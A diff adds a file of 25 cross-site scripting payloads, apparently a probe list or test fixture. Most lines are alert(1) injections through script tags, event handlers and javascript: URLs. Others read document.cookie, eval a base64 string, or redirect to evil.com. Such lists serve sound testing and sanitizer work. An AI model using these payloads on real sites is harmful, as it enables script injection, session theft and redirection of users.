@@ -1,0 +1,25 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+javascript:alert(document.cookie)
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<iframe src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<a href="javascript:alert(1)">click</a>
+<div onmouseover=alert(1)>hover</div>
+<script>document.cookie</script>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<script>document.location='http://evil.com'</script>
+<script>window.location='http://evil.com'</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>String.fromCharCode(88,83,83)</script>
+<div innerHTML="<script>alert(1)</script>">
+<script>document.write('<h1>XSS</h1>')</script>
+<script>setTimeout(function(){alert(1)},0)</script>
+<script>setInterval(function(){alert(1)},1000)</script>
+<script>new Function('alert(1)')()</script>
+<div style="background:url(javascript:alert(1))">
+<div style="width:expression(alert(1))">
